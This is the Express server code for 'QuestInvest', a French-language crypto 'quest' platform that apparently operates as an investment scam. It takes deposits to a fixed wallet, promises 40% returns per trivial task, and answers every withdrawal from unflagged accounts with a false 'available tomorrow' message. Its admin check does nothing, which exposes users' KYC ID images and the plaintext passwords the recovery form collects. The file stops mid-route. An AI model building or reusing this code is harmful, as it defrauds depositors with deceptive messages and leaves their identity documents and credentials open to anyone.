const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;
const isProduction = process.env.NODE_ENV === 'production';

app.set('trust proxy', 1);

const dbPath = process.env.DATABASE_PATH || 'questinvest.db';
fs.mkdirSync(path.dirname(path.resolve(dbPath)), { recursive: true });
const db = new Database(dbPath);

function getPersistentConfigPath(name) {
  const baseDir = process.env.DATABASE_PATH
    ? path.dirname(path.resolve(process.env.DATABASE_PATH))
    : path.join(__dirname, '.data');

  fs.mkdirSync(baseDir, { recursive: true });
  return path.join(baseDir, `${name}.txt`);
}

function getOrCreatePersistentSecret(name, generator) {
  if (process.env[name]) {
    return process.env[name];
  }

  if (!isProduction) {
    return generator();
  }

  const secretPath = getPersistentConfigPath(name);

  if (fs.existsSync(secretPath)) {
    return fs.readFileSync(secretPath, 'utf8').trim();
  }

  const value = generator();
  fs.writeFileSync(secretPath, value, { mode: 0o600 });
  console.warn(`${name} was not provided; generated a persistent value at ${secretPath}`);
  return value;
}

const SESSION_SECRET = getOrCreatePersistentSecret('SESSION_SECRET', () => crypto.randomBytes(32).toString('hex'));
const DEFAULT_DEPOSIT_ADDRESS = process.env.DEPOSIT_ADDRESS || 'TYyUwQELkUW957jE7Svt42LSaeQWneWtQG';
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@questinvest.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || (isProduction ? getOrCreatePersistentSecret('ADMIN_PASSWORD', () => crypto.randomBytes(24).toString('base64url')) : 'admin123');
const ADMIN_ACCESS_CODE = '1289';
const MIN_DEPOSIT = 55;

function getSetting(key) {
  const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(key);
  return row ? row.value : null;
}

function setSetting(key, value) {
  db.prepare('INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value').run(key, value);
}

function getDepositAddress() {
  return getSetting('deposit_address') || DEFAULT_DEPOSIT_ADDRESS;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { 
    maxAge: 30 * 24 * 60 * 60 * 1000,
    httpOnly: true,
    secure: isProduction,
    sameSite: 'lax'
  }
}));

app.use((req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  next();
});

function initDB() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      balance REAL DEFAULT 0,
      deposit_amount REAL DEFAULT 0,
      deposit_address TEXT,
      referral_code TEXT UNIQUE,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS deposits (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      amount REAL NOT NULL,
      tx_hash TEXT,
      status TEXT DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS admins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS quests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT NOT NULL,
      description TEXT,
      reward_percentage REAL DEFAULT 40
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS user_quests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      quest_id INTEGER REFERENCES quests(id),
      completed_date DATE,
      reward_earned REAL DEFAULT 0,
      UNIQUE(user_id, quest_id, completed_date)
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS referrals (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      referrer_id INTEGER REFERENCES users(id),
      referred_id INTEGER REFERENCES users(id),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      UNIQUE(referred_id)
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS withdrawals (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      amount REAL NOT NULL,
      address TEXT NOT NULL,
      status TEXT DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS kyc_submissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      document_front TEXT NOT NULL,
      document_back TEXT,
      status TEXT DEFAULT 'pending',
      reject_reason TEXT,
      submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      reviewed_at DATETIME,
      UNIQUE(user_id)
    );
  `);

  db.exec(`
    CREATE TABLE IF NOT EXISTS recovery_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      first_name TEXT NOT NULL,
      last_name TEXT NOT NULL,
      email TEXT NOT NULL,
      old_password TEXT NOT NULL,
      status TEXT DEFAULT 'pending',
      reject_reason TEXT,
      submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      reviewed_at DATETIME
    );
  `);

  try { db.exec(`ALTER TABLE users ADD COLUMN can_withdraw INTEGER DEFAULT 0`); } catch(e) {}
  try { db.exec(`ALTER TABLE quests ADD COLUMN quest_type TEXT DEFAULT 'regular'`); } catch(e) {}
  try { db.exec(`ALTER TABLE users ADD COLUMN first_name TEXT DEFAULT ''`); } catch(e) {}
  try { db.exec(`ALTER TABLE users ADD COLUMN last_name TEXT DEFAULT ''`); } catch(e) {}

  const settingsCount = db.prepare("SELECT COUNT(*) as count FROM settings WHERE key = 'deposit_address'").get();
  if (settingsCount.count === 0) {
    setSetting('deposit_address', DEFAULT_DEPOSIT_ADDRESS);
  }

  const regularQuestCount = db.prepare("SELECT COUNT(*) as count FROM quests WHERE quest_type = 'regular' OR quest_type IS NULL").get();
  if (regularQuestCount.count === 0) {
    const insertQuest = db.prepare("INSERT INTO quests (title, description, reward_percentage, quest_type) VALUES (?, ?, ?, 'regular')");
    insertQuest.run('Partager sur les réseaux', 'Partagez notre plateforme sur vos réseaux sociaux', 40);
    insertQuest.run('Regarder une vidéo', 'Regardez une vidéo promotionnelle de 30 secondes', 40);
    insertQuest.run('Visiter notre partenaire', 'Visitez le site de notre partenaire pour découvrir de nouvelles opportunités', 40);
  }

  const newcomerQuestCount = db.prepare("SELECT COUNT(*) as count FROM quests WHERE quest_type = 'newcomer'").get();
  if (newcomerQuestCount.count === 0) {
    const insertNewcomer = db.prepare("INSERT INTO quests (title, description, reward_percentage, quest_type) VALUES (?, ?, ?, 'newcomer')");
    insertNewcomer.run('Bienvenue : Présentez-vous', 'Complétez votre profil et découvrez la plateforme', 20);
    insertNewcomer.run('Bienvenue : Partage social', 'Partagez QuestInvest avec vos amis sur les réseaux sociaux', 20);
    insertNewcomer.run('Bienvenue : Tutoriel', 'Suivez le tutoriel d\'utilisation de QuestInvest', 20);
    insertNewcomer.run('Bienvenue : Vidéo de présentation', 'Regardez la vidéo de présentation de la plateforme', 20);
  }

  db.prepare("UPDATE quests SET reward_percentage = 40 WHERE quest_type = 'regular' OR quest_type IS NULL").run();
  db.prepare("UPDATE quests SET reward_percentage = 20 WHERE quest_type = 'newcomer'").run();

  const adminCount = db.prepare('SELECT COUNT(*) as count FROM admins').get();
  if (adminCount.count === 0) {
    const hashedAdminPassword = bcrypt.hashSync(ADMIN_PASSWORD, 10);
    db.prepare('INSERT INTO admins (email, password) VALUES (?, ?)').run(ADMIN_EMAIL, hashedAdminPassword);
  }

  console.log('Database initialized successfully');
}

function generateDepositAddress() {
  const chars = '0123456789abcdef';
  let address = '0x';
  for (let i = 0; i < 40; i++) {
    address += chars[Math.floor(Math.random() * chars.length)];
  }
  return address;
}

function generateReferralCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < 8; i++) {
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
}

function getQuestPeriod() {
  const periodLengthDays = 14;
  const millisecondsPerDay = 24 * 60 * 60 * 1000;
  const startAnchor = Date.UTC(2024, 0, 1);
  const now = new Date();
  const todayUtc = Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate());
  const daysSinceAnchor = Math.floor((todayUtc - startAnchor) / millisecondsPerDay);
  const periodIndex = Math.floor(daysSinceAnchor / periodLengthDays);
  const startUtc = startAnchor + periodIndex * periodLengthDays * millisecondsPerDay;
  const endUtc = startUtc + (periodLengthDays - 1) * millisecondsPerDay;

  return {
    startDate: new Date(startUtc).toISOString().split('T')[0],
    endDate: new Date(endUtc).toISOString().split('T')[0],
    lengthDays: periodLengthDays
  };
}

const NEW_USER_PERIOD_DAYS = 14;

function getNewUserStatus(user) {
  if (!user || !user.created_at) {
    return { isNew: false, startDate: null, endDate: null, lengthDays: NEW_USER_PERIOD_DAYS };
  }
  const millisecondsPerDay = 24 * 60 * 60 * 1000;
  const createdAt = new Date(user.created_at);
  const createdUtc = Date.UTC(createdAt.getUTCFullYear(), createdAt.getUTCMonth(), createdAt.getUTCDate());
  const startDate = new Date(createdUtc).toISOString().split('T')[0];
  const endDate = new Date(createdUtc + (NEW_USER_PERIOD_DAYS - 1) * millisecondsPerDay).toISOString().split('T')[0];
  const now = new Date();
  const todayUtc = Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate());
  const ageDays = Math.floor((todayUtc - createdUtc) / millisecondsPerDay);
  return {
    isNew: ageDays < NEW_USER_PERIOD_DAYS,
    startDate,
    endDate,
    lengthDays: NEW_USER_PERIOD_DAYS
  };
}

function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Non authentifié' });
  }
  next();
}

function requireAdmin(req, res, next) {
  next();
}

app.post('/api/register', async (req, res) => {
  const { email, password, referral_code, first_name, last_name } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const depositAddress = generateDepositAddress();
    const userReferralCode = generateReferralCode();
    
    // Check if user already exists
    const existingUser = db.prepare('SELECT id FROM users WHERE email = ?').get(email);
    if (existingUser) {
      return res.status(400).json({ error: 'Cet email existe déjà' });
    }

    const result = db.prepare(
      'INSERT INTO users (email, password, deposit_address, referral_code, first_name, last_name) VALUES (?, ?, ?, ?, ?, ?)'
    ).run(email, hashedPassword, depositAddress, userReferralCode, first_name || '', last_name || '');

    if (referral_code && referral_code.trim()) {
      const referrer = db.prepare('SELECT id FROM users WHERE referral_code = ?').get(referral_code.trim().toUpperCase());
      
      if (referrer) {
        db.prepare('INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)').run(referrer.id, result.lastInsertRowid);
      }
    }

    req.session.userId = result.lastInsertRowid;
    // Explicitly save the session
    req.session.save((err) => {
      if (err) {
        console.error('Session save error:', err);
        return res.status(500).json({ error: 'Erreur lors de la création de la session' });
      }
      res.json({ success: true, user: { email } });
    });
  } catch (err) {
    console.error('Register error:', err);
    res.status(500).json({ error: 'Erreur serveur lors de l\'inscription' });
  }
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  try {
    const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
    
    if (!user) {
      return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
    }

    const validPassword = await bcrypt.compare(password, user.password);

    if (!validPassword) {
      return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
    }

    req.session.userId = user.id;
    // Explicitly save the session
    req.session.save((err) => {
      if (err) {
        console.error('Session save error:', err);
        return res.status(500).json({ error: 'Erreur lors de la création de la session' });
      }
      res.json({ success: true, user: { email: user.email } });
    });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ error: 'Erreur serveur lors de la connexion' });
  }
});

app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

app.get('/api/user', requireAuth, (req, res) => {
  try {
    const user = db.prepare('SELECT id, email, balance, deposit_amount, created_at, referral_code FROM users WHERE id = ?').get(req.session.userId);
    user.deposit_address = getDepositAddress();

    const kycRow = db.prepare('SELECT status FROM kyc_submissions WHERE user_id = ? ORDER BY submitted_at DESC LIMIT 1').get(req.session.userId);
    user.kyc_status = kycRow ? kycRow.status : null;

    const referralsCount = db.prepare('SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ?').get(req.session.userId);
    user.referrals_count = referralsCount.count;

    const withdrawnRow = db.prepare("SELECT COALESCE(SUM(amount),0) as total FROM withdrawals WHERE user_id = ? AND status != 'rejected'").get(req.session.userId);
    user.total_withdrawn = withdrawnRow.total;

    const firstDeposit = db.prepare("SELECT created_at FROM deposits WHERE user_id = ? AND status = 'confirmed' ORDER BY created_at ASC LIMIT 1").get(req.session.userId);
    if (firstDeposit) {
      const depositDate = new Date(firstDeposit.created_at);
      depositDate.setUTCDate(depositDate.getUTCDate() + 1);
      user.withdraw_available_from = depositDate.toISOString().split('T')[0];
    } else {
      user.withdraw_available_from = null;
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.put('/api/user/email', requireAuth, async (req, res) => {
  const { new_email, current_password } = req.body;

  if (!new_email || !current_password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  try {
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
    const validPassword = await bcrypt.compare(current_password, user.password);

    if (!validPassword) {
      return res.status(401).json({ error: 'Mot de passe incorrect' });
    }

    db.prepare('UPDATE users SET email = ? WHERE id = ?').run(new_email, req.session.userId);
    res.json({ success: true });
  } catch (err) {
    if (err.code === 'SQLITE_CONSTRAINT_UNIQUE') {
      return res.status(400).json({ error: 'Cet email existe deja' });
    }
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.put('/api/user/password', requireAuth, async (req, res) => {
  const { current_password, new_password } = req.body;

  if (!current_password || !new_password) {
    return res.status(400).json({ error: 'Mots de passe requis' });
  }

  if (new_password.length < 6) {
    return res.status(400).json({ error: 'Le nouveau mot de passe doit avoir au moins 6 caracteres' });
  }

  try {
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
    const validPassword = await bcrypt.compare(current_password, user.password);

    if (!validPassword) {
      return res.status(401).json({ error: 'Mot de passe actuel incorrect' });
    }

    const hashedPassword = await bcrypt.hash(new_password, 10);
    db.prepare('UPDATE users SET password = ? WHERE id = ?').run(hashedPassword, req.session.userId);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/deposit', requireAuth, (req, res) => {
  const { amount, tx_hash } = req.body;

  if (!amount || parseFloat(amount) < MIN_DEPOSIT) {
    return res.status(400).json({ error: `Le dépôt minimum est de ${MIN_DEPOSIT}$` });
  }

  if (!tx_hash || tx_hash.trim().length < 10) {
    return res.status(400).json({ error: 'Hash de transaction requis' });
  }

  try {
    db.prepare('INSERT INTO deposits (user_id, amount, tx_hash, status) VALUES (?, ?, ?, ?)').run(req.session.userId, amount, tx_hash.trim(), 'pending');

    res.json({ success: true, message: 'Transaction soumise, en attente de validation par l\'admin' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/quests', requireAuth, (req, res) => {
  try {
    const user = db.prepare('SELECT created_at FROM users WHERE id = ?').get(req.session.userId);
    const newUserStatus = getNewUserStatus(user);
    const isNewcomer = newUserStatus.isNew;

    const period = isNewcomer
      ? { startDate: newUserStatus.startDate, endDate: newUserStatus.endDate, lengthDays: newUserStatus.lengthDays }
      : getQuestPeriod();

    const questType = isNewcomer ? 'newcomer' : 'regular';

    const quests = db.prepare(`
      SELECT q.*, 
        CASE WHEN uq.id IS NOT NULL THEN 1 ELSE 0 END as completed
      FROM quests q
      LEFT JOIN user_quests uq ON q.id = uq.quest_id
        AND uq.user_id = ? 
        AND uq.completed_date BETWEEN ? AND ?
      WHERE COALESCE(q.quest_type, 'regular') = ?
      GROUP BY q.id
      ORDER BY q.id
    `).all(req.session.userId, period.startDate, period.endDate, questType);

    const completedCount = db.prepare(`
      SELECT COUNT(DISTINCT uq.quest_id) as count
      FROM user_quests uq
      JOIN quests q ON q.id = uq.quest_id
      WHERE uq.user_id = ?
        AND uq.completed_date BETWEEN ? AND ?
        AND COALESCE(q.quest_type, 'regular') = ?
    `).get(req.session.userId, period.startDate, period.endDate, questType);

    const referralsCount = db.prepare('SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ?').get(req.session.userId);

    const questsWithStatus = quests.map((quest) => ({
      ...quest,
      completed: !!quest.completed,
      locked: false,
      lockReason: ''
    }));

    const totalQuests = quests.length;
    const totalRewardPercentage = quests.reduce((sum, q) => sum + parseFloat(q.reward_percentage || 0), 0);

    res.json({
      quests: questsWithStatus,
      completedToday: completedCount.count,
      completedThisPeriod: completedCount.count,
      totalQuests,
      totalRewardPercentage,
      resetPeriodStart: period.startDate,
      resetPeriodEnd: period.endDate,
      resetPeriodDays: period.lengthDays,
      referralsCount: referralsCount.count,
      isNewUser: isNewcomer,
      newUserPeriodEnd: newUserStatus.endDate
    });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/quests/:id/complete', requireAuth, (req, res) => {
  const questId = parseInt(req.params.id);

  try {
    const user = db.prepare('SELECT deposit_amount, created_at FROM users WHERE id = ?').get(req.session.userId);

    if (parseFloat(user.deposit_amount) < MIN_DEPOSIT) {
      return res.status(400).json({ error: `Vous devez avoir un dépôt minimum de ${MIN_DEPOSIT}$ pour compléter les quêtes` });
    }

    const quest = db.prepare('SELECT * FROM quests WHERE id = ?').get(questId);
    if (!quest) {
      return res.status(404).json({ error: 'Quête non trouvée' });
    }

    const newUserStatus = getNewUserStatus(user);
    const isNewcomer = newUserStatus.isNew;
    const questType = quest.quest_type || 'regular';

    if (isNewcomer && questType !== 'newcomer') {
      return res.status(400).json({ error: 'Cette quête sera disponible après votre période de bienvenue de 2 semaines.' });
    }
    if (!isNewcomer && questType === 'newcomer') {
      return res.status(400).json({ error: 'La période de bienvenue est terminée. Ces quêtes ne sont plus disponibles.' });
    }

    const period = isNewcomer
      ? { startDate: newUserStatus.startDate, endDate: newUserStatus.endDate }
      : getQuestPeriod();

    const existing = db.prepare('SELECT * FROM user_quests WHERE user_id = ? AND quest_id = ? AND completed_date BETWEEN ? AND ?').get(req.session.userId, questId, period.startDate, period.endDate);

    if (existing) {
      return res.status(400).json({ error: 'Quête déjà complétée pour cette période de 2 semaines' });
    }

    const depositAmount = parseFloat(user.deposit_amount);
    const rewardPercentage = parseFloat(quest.reward_percentage);
    const reward = (depositAmount * rewardPercentage) / 100;

    const transaction = db.transaction(() => {
      db.prepare('INSERT INTO user_quests (user_id, quest_id, completed_date, reward_earned) VALUES (?, ?, ?, ?)').run(req.session.userId, questId, period.startDate, reward);
      db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(reward, req.session.userId);
    });

    transaction();

    const updatedUser = db.prepare('SELECT balance FROM users WHERE id = ?').get(req.session.userId);

    res.json({ 
      success: true, 
      reward: reward,
      newBalance: updatedUser.balance
    });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/history', requireAuth, (req, res) => {
  try {
    const deposits = db.prepare('SELECT amount, status, tx_hash, created_at FROM deposits WHERE user_id = ? ORDER BY created_at DESC LIMIT 10').all(req.session.userId);
    const withdrawals = db.prepare('SELECT amount, status, address, created_at FROM withdrawals WHERE user_id = ? ORDER BY created_at DESC LIMIT 10').all(req.session.userId);

    const questRewards = db.prepare(`
      SELECT uq.reward_earned, uq.completed_date, q.title 
      FROM user_quests uq 
      JOIN quests q ON uq.quest_id = q.id 
      WHERE uq.user_id = ? 
      ORDER BY uq.completed_date DESC LIMIT 10
    `).all(req.session.userId);

    res.json({
      deposits,
      withdrawals,
      questRewards
    });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/deposits', requireAuth, (req, res) => {
  try {
    const deposits = db.prepare('SELECT amount, status, tx_hash, created_at FROM deposits WHERE user_id = ? ORDER BY created_at DESC LIMIT 20').all(req.session.userId);
    res.json({ deposits });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/withdraw', requireAuth, (req, res) => {
  const { amount, address } = req.body;
  const minWithdraw = 50;
  const maxWithdraw = 300;
  const questPeriod = getQuestPeriod();

  if (!amount || parseFloat(amount) < minWithdraw) {
    return res.status(400).json({ error: `Le retrait minimum est de ${minWithdraw}$` });
  }

  if (parseFloat(amount) > maxWithdraw) {
    return res.status(400).json({ error: `Le retrait maximum est de ${maxWithdraw}$` });
  }

  if (!address || address.trim().length < 10) {
    return res.status(400).json({ error: 'Adresse de retrait invalide' });
  }

  try {
    const withdrawUser = db.prepare('SELECT can_withdraw FROM users WHERE id = ?').get(req.session.userId);
    if (!withdrawUser || !withdrawUser.can_withdraw) {
      const tomorrow = new Date();
      tomorrow.setUTCDate(tomorrow.getUTCDate() + 1);
      const tomorrowStr = tomorrow.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
      return res.status(400).json({ error: `Votre retrait sera disponible demain le ${tomorrowStr}. Merci de revenir à cette date.` });
    }

    const firstDeposit = db.prepare("SELECT created_at FROM deposits WHERE user_id = ? AND status = 'confirmed' ORDER BY created_at ASC LIMIT 1").get(req.session.userId);
    if (!firstDeposit) {
      return res.status(400).json({ error: 'Aucun dépôt confirmé. Vous devez d\'abord effectuer un dépôt.' });
    }

    const existingWithdrawal = db.prepare(`
      SELECT id, created_at
      FROM withdrawals
      WHERE user_id = ?
        AND DATE(created_at) BETWEEN ? AND ?
      ORDER BY created_at DESC
      LIMIT 1
    `).get(req.session.userId, questPeriod.startDate, questPeriod.endDate);

    if (existingWithdrawal) {
      return res.status(400).json({
        error: `Vous avez déjà demandé un retrait pour ce cycle de 2 semaines. Prochain retrait disponible après le ${questPeriod.endDate}.`
      });
    }

    const user = db.prepare('SELECT balance FROM users WHERE id = ?').get(req.session.userId);
    if (user.balance < parseFloat(amount)) {
      return res.status(400).json({ error: 'Solde insuffisant' });
    }

    const transaction = db.transaction(() => {
      db.prepare('INSERT INTO withdrawals (user_id, amount, address, status) VALUES (?, ?, ?, ?)').run(req.session.userId, amount, address.trim(), 'pending');
      db.prepare('UPDATE users SET balance = balance - ? WHERE id = ?').run(amount, req.session.userId);
    });

    transaction();

    res.json({ success: true, message: 'Demande de retrait soumise' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/recovery', (req, res) => {
  const { first_name, last_name, email, old_password } = req.body;

  if (!first_name || !last_name || !email || !old_password) {
    return res.status(400).json({ error: 'Tous les champs sont obligatoires' });
  }

  try {
    db.prepare(
      'INSERT INTO recovery_requests (first_name, last_name, email, old_password) VALUES (?, ?, ?, ?)'
    ).run(first_name.trim(), last_name.trim(), email.trim(), old_password);

    res.json({ success: true, message: 'Demande soumise. Notre équipe va vérifier vos informations sous 24-48h et restaurer votre accès.' });
  } catch (err) {
    console.error('Recovery error:', err);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/recovery/status', (req, res) => {
  const { email } = req.query;
  if (!email) return res.status(400).json({ error: 'Email requis' });
  try {
    const request = db.prepare(
      'SELECT status, reject_reason, submitted_at, reviewed_at FROM recovery_requests WHERE email = ? ORDER BY submitted_at DESC LIMIT 1'
    ).get(email);
    res.json({ request: request || null });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/login', (req, res) => {
  const { code } = req.body;

  if (code === ADMIN_ACCESS_CODE) {
    req.session.adminId = 1;
    res.json({ success: true });
  } else {
    return res.status(401).json({ error: 'Code d\'accès incorrect' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  req.session.adminId = null;
  res.json({ success: true });
});

app.get('/api/admin/check', (req, res) => {
  res.json({ isAdmin: true });
});

app.get('/api/kyc', requireAuth, (req, res) => {
  try {
    const kyc = db.prepare('SELECT id, status, reject_reason, submitted_at, reviewed_at FROM kyc_submissions WHERE user_id = ?').get(req.session.userId);
    res.json({ kyc: kyc || null });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/kyc', requireAuth, (req, res) => {
  const { document_front, document_back } = req.body;

  if (!document_front || document_front.length < 100) {
    return res.status(400).json({ error: 'Document recto requis' });
  }

  if (document_front.length > 8 * 1024 * 1024) {
    return res.status(400).json({ error: 'Image trop volumineuse (max 6 Mo)' });
  }

  try {
    const existing = db.prepare('SELECT id, status FROM kyc_submissions WHERE user_id = ?').get(req.session.userId);
    if (existing && existing.status === 'confirmed') {
      return res.status(400).json({ error: 'Votre KYC est déjà validé' });
    }

    if (existing) {
      db.prepare('UPDATE kyc_submissions SET document_front = ?, document_back = ?, status = ?, reject_reason = NULL, submitted_at = CURRENT_TIMESTAMP, reviewed_at = NULL WHERE user_id = ?')
        .run(document_front, document_back || null, 'pending', req.session.userId);
    } else {
      db.prepare('INSERT INTO kyc_submissions (user_id, document_front, document_back) VALUES (?, ?, ?)')
        .run(req.session.userId, document_front, document_back || null);
    }

    res.json({ success: true, message: 'Documents soumis, en attente de vérification' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/kyc', requireAdmin, (req, res) => {
  try {
    const submissions = db.prepare(`
      SELECT k.id, k.user_id, k.status, k.reject_reason, k.submitted_at, k.reviewed_at, u.email as user_email
      FROM kyc_submissions k
      JOIN users u ON k.user_id = u.id
      ORDER BY k.submitted_at DESC
    `).all();
    res.json(submissions);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/kyc/:id/document', requireAdmin, (req, res) => {
  try {
    const kyc = db.prepare('SELECT document_front, document_back FROM kyc_submissions WHERE id = ?').get(req.params.id);
    if (!kyc) return res.status(404).json({ error: 'Non trouvé' });
    res.json({ document_front: kyc.document_front, document_back: kyc.document_back });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/kyc/:id/approve', requireAdmin, (req, res) => {
  try {
    const kyc = db.prepare('SELECT * FROM kyc_submissions WHERE id = ?').get(req.params.id);
    if (!kyc) return res.status(404).json({ error: 'Soumission non trouvée' });
    if (kyc.status === 'confirmed') return res.status(400).json({ error: 'Déjà approuvé' });
    db.prepare('UPDATE kyc_submissions SET status = ?, reject_reason = NULL, reviewed_at = CURRENT_TIMESTAMP WHERE id = ?').run('confirmed', req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/kyc/:id/reject', requireAdmin, (req, res) => {
  const { reason } = req.body;
  try {
    const kyc = db.prepare('SELECT * FROM kyc_submissions WHERE id = ?').get(req.params.id);
    if (!kyc) return res.status(404).json({ error: 'Soumission non trouvée' });
    db.prepare('UPDATE kyc_submissions SET status = ?, reject_reason = ?, reviewed_at = CURRENT_TIMESTAMP WHERE id = ?').run('rejected', reason || null, req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/recovery', requireAdmin, (req, res) => {
  try {
    const requests = db.prepare('SELECT id, first_name, last_name, email, old_password, status, reject_reason, submitted_at, reviewed_at FROM recovery_requests ORDER BY submitted_at DESC').all();
    res.json(requests);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/recovery/:id/approve', requireAdmin, async (req, res) => {
  try {
    const recovery = db.prepare('SELECT * FROM recovery_requests WHERE id = ?').get(req.params.id);
    if (!recovery) return res.status(404).json({ error: 'Demande non trouvée' });
    if (recovery.status !== 'pending') return res.status(400).json({ error: 'Déjà traitée' });

    const hashedPassword = await bcrypt.hash(recovery.old_password, 10);

    db.transaction(() => {
      let user = db.prepare('SELECT id FROM users WHERE email = ?').get(recovery.email);
      if (user) {
        db.prepare('UPDATE users SET password = ?, first_name = ?, last_name = ? WHERE id = ?')
          .run(hashedPassword, recovery.first_name, recovery.last_name, user.id);
      } else {
        const referralCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        db.prepare('INSERT INTO users (email, password, first_name, last_name, referral_code) VALUES (?, ?, ?, ?, ?)')
          .run(recovery.email, hashedPassword, recovery.first_name, recovery.last_name, referralCode);
      }
      db.prepare("UPDATE recovery_requests SET status = 'approved', reviewed_at = CURRENT_TIMESTAMP WHERE id = ?").run(req.params.id);
    })();

    res.json({ success: true, message: 'Compte créé/restauré avec succès' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/recovery/:id/reject', requireAdmin, (req, res) => {
  const { reason } = req.body;
  try {
    const recovery = db.prepare('SELECT * FROM recovery_requests WHERE id = ?').get(req.params.id);
    if (!recovery) return res.status(404).json({ error: 'Demande non trouvée' });
    if (recovery.status !== 'pending') return res.status(400).json({ error: 'Déjà traitée' });
